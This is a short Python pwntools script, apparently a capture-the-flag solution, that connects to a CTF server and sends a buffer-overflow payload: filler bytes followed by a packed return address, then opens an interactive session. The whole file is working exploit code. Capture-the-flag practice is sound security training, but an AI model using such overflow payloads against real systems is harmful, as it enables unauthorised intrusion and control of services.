from pwn import *

r=remote("ctf.j0n9hyun.xyz",3011)

print r.recvrepeat(0.5)

payload = "a"
payload += "I"*21
payload += p32(0x08048f0d)

print r.sendline(payload)
print r.recvrepeat(0.9)
r.interactive()

